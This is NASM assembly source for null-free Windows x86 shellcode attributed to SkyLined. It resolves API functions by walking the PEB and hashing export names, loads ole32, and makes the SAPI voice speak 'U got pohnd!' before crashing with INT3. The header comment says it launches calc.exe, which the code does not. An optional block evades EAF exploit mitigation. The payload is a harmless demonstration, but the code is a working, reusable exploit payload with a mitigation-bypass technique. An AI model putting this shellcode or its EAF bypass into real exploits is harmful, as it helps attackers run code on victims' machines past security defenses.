; Copyright (c) 2009-2010, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that executes calc.exe.
; Works in any application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; This version uses 16-bit hashes.

%include 'w32-speaking-shellcode-hash-list.asm'

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
find_hash: ; Find ntdll's InInitOrder list of modules:
    XOR     ESI, ESI                    ; ESI = 0
    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)

%ifdef DEFEAT_EAF
  ; The first loaded module is ntdll on x86 systems and ntdll32 on x64 systems. Both modules have this code:
  ; ntdll32!RtlGetCurrentPeb (<no parameter info>)
  ;     64a118000000    mov     eax,dword ptr fs:[00000018h]
  ;     8b4030          mov     eax,dword ptr [eax+30h]
  ;     c3              ret
      MOV     EDX, [ESI + 0x08]           ; EDX = InInitOrder[X].base_address == module
      MOVZX   EBP, WORD [EDX + 0x3C]      ; EBX = module->pe_header_offset
      ADD     EDX, [EDX + EBP + 0x2C]     ; EDX = module + module.pe_header->code_offset == module code
      MOV     DH, 0xF                     ; The EAF breakpoints are in tables that are at the start of ntdll,
                                          ; so we can avoid them easily...
  scan_for_memory_reader:
      INC     EDX
      CMP     DWORD [EDX], 0xC330408B     ; EDX => MOV EAX, [EAX+30], RET ?
      JNE     scan_for_memory_reader
      PUSH    EDX                         ; Stack = &(defeat eaf)
%endif
    PUSH    ESI                         ; Stack = InInitOrder[0], [&(defeat eaf)]
    MOV     SI, hash_kernel32_LoadLibraryA

next_module: ; Get the baseaddress of the current module and find the next module:
    POP     EDI                         ; EDI = InInitOrder[X] | Stack = [&(defeat eaf), ] "ole32\0\0\0"
    MOV     EBP, [EDI + 0x08]           ; EBP = InInitOrder[X].base_address
    PUSH    DWORD [EDI]                 ; Stack = InInitOrder[X].flink == InInitOrder[X+1], [&(defeat eaf), ] "ole32\0\0\0"
get_proc_address_loop: ; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers
    JCXZ    next_module                 ; No name pointers? Next module.
next_function_loop: ; Get the next function name for hashing:
    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)
    ADD     EDI, EBP                    ; EDI = &(names table)
    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)
    ADD     EDI, EBP                    ; EDI = &(function name)
    XOR     EAX, EAX                    ; EAX = 0
    CDQ                                 ; EDX = 0
hash_loop: ; Hash the function name and compare with requested hash
    XOR     DL, [EDI]
    ROR     DX, BYTE hash_ror_value
    SCASB
    JNE     hash_loop
    DEC     ECX
    CMP     DX, SI                      ; Is this the hash we're looking for?
    JE      found_function              ;
    JCXZ    next_module                 ; Not the right hash and no functions left in module? Next module
    JMP     next_function_loop          ; Not the right hash and functions left in module? Next function
found_function:
    ; Found the right hash: get the address of the function:
    MOV     ESI, [EBX + 0x24]           ; ESI = offset ordinals table
    ADD     ESI, EBP                    ; ESI = &oridinals table
    MOVZX   ESI, WORD [ESI + 2 * ECX]   ; ESI = ordinal number of function
%ifdef DEFEAT_EAF
    LEA     EAX, [EBX + 0x1C - 0x30]    ; EAX = &offset address table - MEMORY_READER_OFFSET
    CALL    [ESP + 4]                   ; call defeat eaf: EAX = [EAX + 0x30] == [&offset address table] == offset address table
%else
    MOV     EAX, [EBX + 0x1C]           ; EDI = offset address table
%endif
    ADD     EAX, EBP                    ; EAX = &address table
    MOV     EDI, [EAX + 4 * ESI]        ; EDI = offset function
    ADD     EDI, EBP                    ; EDI = &(function)
    XOR     ESI, ESI                    ; ESI = 0
    CMP     DX, hash_ole32_CoInitialize ;
    JE      ole32_CoInitialize          ;
    CMP     DX, hash_ole32_CoCreateInstance
    JE      ole32_CoCreateInstance      ;
kernel32_LoadLibrary:
    PUSH    BYTE '2'                    ; Stack = "2\0\0\0", InInitOrder[X] [, &(defeat eaf)]
    PUSH    B2DW('o', 'l', 'e', '3')    ; Stack = "ole32\0\0\0", InInitOrder[X] [, &(defeat eaf)]
    PUSH    ESP                         ; Stack = &("ole32"), "ole32\0\0\0", InInitOrder[X] [, &(defeat eaf)]
    CALL    EDI                         ; LoadLibraryA(&("ole32")) | Stack = "ole32\0\0\0", InInitOrder[X] [, &(defeat eaf)]
    XCHG    EAX, EBP                    ; EBP = &(ole32.dll)
%ifdef DEFEAT_EAF
    POP     EAX                         ; Stack = "2\0\0\0", InInitOrder[X], &(defeat eaf)]
    POP     EAX                         ; Stack = InInitOrder[X], &(defeat eaf)
%endif
    MOV     SI, hash_ole32_CoInitialize ;
    JMP     get_proc_address_loop

ole32_CoInitialize:
    PUSH    ESI                         ; Stack = 0, InInitOrder[X] [, &(defeat eaf)]
    CALL    EDI                         ; CoInitialize(NULL), Stack = InInitOrder[X] [, &(defeat eaf)]
    MOV     SI, hash_ole32_CoCreateInstance ;
    JMP     get_proc_address_loop
    
ole32_CoCreateInstance:
    PUSH    0xd422046e
    PUSH    0x99efeca1
    PUSH    0x499272b9
    PUSH    0x6c44df74                  ; Stack = IID_ISpVoice, ....
    MOV     EAX, ESP                    ; EAX = &(IID_ISpVoice)
    PUSH    0x9673794f
    PUSH    0xc001e39e
    DEC     DWORD [ESP+2]
    PUSH    0x11d23391
    PUSH    0x96749377                  ; Stack = CLSID_SpVoice, IID_ISpVoice, ....
    MOV     EBX, ESP                    ; EBX = &(CLSID_SpVoice), ...
    PUSH    ESI                         ; Stack = voice, CLSID_SpVoice, IID_ISpVoice, ....
    PUSH    ESP                         ; Stack = &(voice), voice, CLSID_SpVoice, IID_ISpVoice, ....
    PUSH    EAX                         ; Stack = &(IID_ISpVoice), &(voice), voice, CLSID_SpVoice, IID_ISpVoice, ....
    PUSH    BYTE 0x17                   ; Stack = CLSCTX_ALL, &(IID_ISpVoice), &(voice), voice, ....
    PUSH    ESI                         ; Stack = NULL, CLSCTX_ALL, &(IID_ISpVoice), &(voice), voice, ....
    PUSH    EBX                         ; Stack = &(CLSID_SpVoice), NULL, CLSCTX_ALL, &(IID_ISpVoice), &(voice), voice, ....
    CALL    EDI                         ; CoCreateInstance(&(CLSID_SpVoice), NULL, CLSCTX_ALL, &(IID_ISpVoice), &voice) | Stack = voice, ...
    POP     EBX                         ; EBX = voice | Stack = ...
    PUSH    B2DW('o', 'g', ' ', 'U')    ; Stack = "og U", ...
    PUSH    B2DW('o', 'p', ' ', 't')    ; Stack = "op tog U", ...
    PUSH    B2DW('!', 'd', 'n', 'h')    ; Stack = "!dnhop tog U", ...
    XCHG    EAX, ESI                    ; EAX = 0
    MOV     ESI, ESP                    ; ESI = &("!dnhop tog U")
    PUSH    EAX                         ; Stack = 0, "!dnhop tog U", ...
unicode_loop:
    LODSB                               ; read: "!dnhop tog U"
    PUSH    AX                          ; write: Stack = u"U got pohnd!", 0, "!dnhop tog U", ...
    CMP     AL, 'U'                     ; EAX == 0? (WCHAR == '\0'?)
    JNE     unicode_loop
    MOV     ECX, ESP                    ; ECX = &(u"U got pohnd!\0")
    XOR     EAX, EAX                    ; EAX = 0
    PUSH    EAX                         ; Stack = 0, ...
    PUSH    EAX                         ; Stack = 0, 0, ...
    PUSH    ECX                         ; Stack = &(u"U got pohnd!\0"), 0, 0, ...
    PUSH    EBX                         ; Stack = voice, &(u"U got pohnd!\0"), 0, 0, ...
    MOV     EDX, [EBX]                  ; EDX = voice->vftable
    MOV     ECX, [EDX+0x50]             ; ECX = voice->vftable->Speak
    CALL    ECX                         ; SpVoice::Speak(voice, &(u"U got pohnd!\0"), 0, 0) | Stack = ...
    INT3                                ; Crash
